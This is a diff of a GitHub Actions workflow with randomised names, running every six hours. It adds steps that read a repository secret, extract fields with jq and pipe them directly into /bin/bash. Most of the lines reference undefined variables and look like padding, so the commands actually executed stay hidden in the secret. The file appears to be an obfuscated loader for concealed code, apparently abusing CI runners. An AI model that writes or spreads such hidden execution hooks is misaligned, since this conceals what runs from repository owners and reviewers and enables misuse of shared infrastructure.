@@ -3,24 +3,29 @@ name: anzaidong1887
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '43 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: anzaidong1887
         env:
-          g13125: ${{ secrets.g13125 }}
+          c26486: ${{ secrets.c26486 }}
         run: |
-          echo $g13125 | jq -r .g15909 | /bin/bash
-          echo $hcmsm95 | jq -r .$bolst82 | /bin/bash
-          echo $w7 | jq -r .$yiux900 | /bin/bash
-          echo $b720 | jq -r .$ipry606 | /bin/bash
-          echo $ogma4 | jq -r .$bhe158 | /bin/bash
-          echo $cosyn611 | jq -r .$dghyf66467 | /bin/bash
-          echo $sxanw4 | jq -r .$hn5 | /bin/bash
-          echo $z06 | jq -r .$fzl83 | /bin/bash
-          echo $bfaw5324 | jq -r .$wlqij53 | /bin/bash
-          echo $jn024 | jq -r .$f61584 | /bin/bash
+          echo $c26486 | jq -r .z16424 | /bin/bash
+          echo $vq3978 | jq -r .e73023 | /bin/bash
+          echo $p338 | jq -r .kmmc1425 | /bin/bash
+          echo $oqd355 | jq -r .n90 | /bin/bash
+          echo $c624 | jq -r .em7 | /bin/bash
+          echo $nvncf315 | jq -r .cns53 | /bin/bash
+          echo $kj48 | jq -r .btrq0 | /bin/bash
+          echo $msguo72679 | jq -r .y9 | /bin/bash
+          echo $svc8 | jq -r .ri88 | /bin/bash
+          echo $purw07 | jq -r .fp90 | /bin/bash
+          echo $mczzj89 | jq -r .r95 | /bin/bash
+          echo $qlg74 | jq -r .dnvpt9 | /bin/bash
+          echo $dbph803 | jq -r .dfhpn1471 | /bin/bash
+          echo $aif75960 | jq -r .dp2 | /bin/bash
 
